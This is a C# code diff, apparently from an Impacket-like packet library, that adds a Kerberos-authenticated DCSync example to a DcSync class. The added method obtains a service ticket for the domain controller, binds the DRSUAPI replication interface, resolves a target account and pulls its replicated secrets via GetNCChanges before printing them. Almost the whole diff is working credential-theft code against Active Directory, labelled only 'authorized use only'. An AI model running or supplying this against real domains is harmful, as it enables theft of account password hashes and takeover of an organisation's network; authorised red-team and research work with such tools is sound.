@@ -1,6 +1,7 @@
 using System.Buffers.Binary;
 using DotNetPacket.Core;
 using DotNetPacket.Protocols.Dcerpc;
+using DotNetPacket.Protocols.Krb5;
 
 namespace DotNetPacket.Examples;
 
@@ -252,6 +253,92 @@ internal static class DcSync
         }
 
         return w.ToArray();
+    }
+
+    /// <summary>
+    /// dcsync with Kerberos (-k): authenticate the DRSUAPI bind with a Kerberos ticket (DCE-style
+    /// GSS-NEGOTIATE) instead of NTLM. SPN is host/&lt;dc-fqdn&gt;. Lab-first, authorized use only.
+    /// </summary>
+    public static int RunKerberos(string[] args)
+    {
+        if (args.Length < 7)
+        {
+            Console.Error.WriteLine(
+                "usage: dcsync-k <dc-host> <user> <password> <domain-fqdn> <target-user> <dc-fqdn> [netbios-domain] [epm-port]");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string domainFqdn = args[4];
+        string targetUser = args[5];
+        string dcFqdn = args[6];
+        string netbios = args.Length >= 8 ? args[7] : domainFqdn.Split('.')[0].ToUpperInvariant();
+        int epmPort = args.Length >= 9 ? int.Parse(args[8]) : 135;
+
+        // 1) Get a service ticket for host/<dc-fqdn> (AES) via the KDC.
+        ServiceTicket ticket = KerberosClient.GetServiceTicketForSpn(
+            host, domainFqdn.ToUpperInvariant(), user, password, null, null, $"host/{dcFqdn}");
+        Console.WriteLine($"Service ticket for host/{dcFqdn} (etype {ticket.SessionKeyEtype}).");
+
+        // 2) Resolve drsuapi's dynamic port and bind it with Kerberos (DCE-style GSS seal).
+        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
+        mapper.Bind(DcerpcInterface.Epm);
+        EpmMapResult? mapped = Epm.MapTcp(mapper, DcerpcInterface.Drsuapi);
+        mapper.Close();
+        if (mapped is null)
+        {
+            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
+            return 1;
+        }
+
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, mapped.Port);
+        DcerpcBindAck ack = pipe.BindKerberos(DcerpcInterface.Drsuapi, ticket, DcerpcAuthLevel.PacketPrivacy);
+        if (!ack.Accepted)
+        {
+            Console.Error.WriteLine($"Kerberos drsuapi bind rejected (result {ack.Result}, reason {ack.Reason}).");
+            return 1;
+        }
+
+        byte[]? sessionKey = pipe.SessionKey;
+        if (sessionKey is null)
+        {
+            Console.Error.WriteLine("No Kerberos session key after bind.");
+            return 1;
+        }
+
+        Console.WriteLine("Kerberos DRSUAPI bind accepted (DCE-style, sealed).");
+
+        // 3) Drive the DCSync replication exactly as the NTLM path does.
+        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
+        if (bind.ReplEpoch != 0)
+        {
+            bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
+        }
+
+        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
+            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo, Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
+
+        string nt4 = $"{netbios}\\{targetUser}";
+        Drsuapi.CrackedName cracked = Drsuapi.ParseCrackNamesResponse(
+            pipe.Call(Drsuapi.OpnumDrsCrackNames,
+                Drsuapi.BuildCrackNamesStub(bind.Handle, Drsuapi.DsNt4AccountName, Drsuapi.DsUniqueIdName, nt4)));
+        if (cracked.Status != 0 || string.IsNullOrEmpty(cracked.Name))
+        {
+            Console.Error.WriteLine($"DRSCrackNames failed for {nt4} (status {cracked.Status}).");
+            return 1;
+        }
+
+        Guid targetGuid = Guid.Parse(cracked.Name.Trim('{', '}'));
+        DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
+            pipe.Call(Drsuapi.OpnumDrsGetNcChanges, Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid)));
+
+        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
+        pipe.Close();
+
+        PrintSecrets(obj, sessionKey, targetUser);
+        return 0;
     }
 
     private static void PrintSecrets(DrsReplicaObject obj, byte[] sessionKey, string fallbackName)
